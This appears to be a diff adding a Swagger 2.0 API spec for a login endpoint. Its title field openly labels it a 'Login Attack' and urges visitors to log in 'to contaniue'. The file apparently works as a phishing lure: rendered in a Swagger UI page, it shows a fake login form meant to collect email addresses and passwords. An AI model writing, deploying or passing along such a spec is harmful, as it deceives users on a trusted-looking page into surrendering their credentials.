@@ -1,0 +1,44 @@
+swagger: "2.0"
+info:
+  title: /*Login Attack BY M0X0101*/ Hello user plese make login blow to contaniue thanks
+  description: An API that allows users to log in to a web application
+  version: "1.0"
+
+basePath: /api
+
+schemes:
+  - https
+  - http
+
+paths:
+  /login:
+    post:
+      summary: Logs a user in to the web application
+      consumes:
+        - application/json
+      produces:
+        - application/json
+      parameters:
+        - name: email
+          in: body
+          description: The email address of the user
+          required: true
+          schema:
+            type: string
+        - name: password
+          in: body
+          description: The password of the user
+          required: true
+          schema:
+            type: string
+      responses:
+        200:
+          description: Successful login
+          schema:
+            type: object
+            properties:
+              token:
+                type: string
+                description: An authentication token that can be used for subsequent requests
+        400:
+          description: Invalid login credentials
